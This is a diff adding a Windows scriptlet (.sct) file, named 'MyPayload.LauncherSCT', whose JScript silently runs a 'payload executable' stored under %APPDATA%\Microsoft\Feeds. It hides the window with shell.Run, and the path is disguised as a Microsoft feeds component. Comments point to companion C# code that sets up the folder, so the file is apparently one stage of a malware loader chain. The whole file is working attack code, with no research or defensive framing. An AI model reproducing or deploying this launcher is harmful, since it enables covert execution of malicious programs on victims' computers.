@@ -1,0 +1,67 @@
+<?xml version="1.0"?>
+<scriptlet>
+  <registration
+      progid="MyPayload.LauncherSCT"
+      classid="{3041efca-5fb4-4f53-b9f6-8ccc8aef6711}" <!-- Generate a NEW, UNIQUE GUID for this scriptlet component -->
+      remotable="true">
+    <script language="JScript">
+      <![CDATA[
+        // This is a dummy object for the scriptlet component registration.
+        // The main logic is in the 'script' tag below.
+      ]]>
+    </script>
+  </registration>
+
+  <script language="JScript">
+    <![CDATA[
+      // --- CONFIGURATION ---
+      var relativeDirPath = "\\Microsoft\\Feeds";       // The directory name within APPDATA
+      var executableName  = "feeds.exe";  // The name of your payload executable in that directory
+
+      function writeLog(message) {
+        try {
+          var fso = new ActiveXObject("Scripting.FileSystemObject");
+          var shell = new ActiveXObject("WScript.Shell");
+          var appDataPath = shell.ExpandEnvironmentStrings("%APPDATA%");
+          var logDir = appDataPath + relativeDirPath;
+          var logFilePath = logDir + "\\sct_execution.log";
+
+          if (!fso.FolderExists(logDir)) {
+            // Attempt to create if it doesn't exist, though C# code should have.
+            // This is a fallback.
+            try { fso.CreateFolder(logDir); } catch (e) { /* best effort */ }
+          }
+          
+          var ts = fso.OpenTextFile(logFilePath, 8, true); // 8 = Append, true = Create if not exists
+          var now = new Date();
+          ts.WriteLine("[" + now.toUTCString() + "] " + message);
+          ts.Close();
+        } catch (e) {
+          // Cannot log, oh well.
+        }
+      }
+
+      try {
+        writeLog("SCT Scriptlet: Starting execution.");
+        var shell = new ActiveXObject("WScript.Shell");
+        var appData = shell.ExpandEnvironmentStrings("%APPDATA%");
+        var fullExePath = appData + relativeDirPath + "\\" + executableName;
+        writeLog("SCT Scriptlet: Attempting to launch: " + fullExePath);
+
+        // Check if file exists before trying to run (optional, but good for debug)
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
+        if (fso.FileExists(fullExePath)) {
+          writeLog("SCT Scriptlet: File exists. Running...");
+          // The '0' hides the window, 'false' means don't wait for it to finish.
+          shell.Run('"' + fullExePath + '"', 0, false);
+          writeLog("SCT Scriptlet: shell.Run command issued for " + fullExePath);
+        } else {
+          writeLog("SCT Scriptlet: ERROR - Executable not found at: " + fullExePath);
+        }
+      } catch (e) {
+        var errorMsg = "SCT Scriptlet: EXCEPTION - " + (e.description || e.message || "Unknown error");
+        writeLog(errorMsg);
+      }
+    ]]>
+  </script>
+</scriptlet>
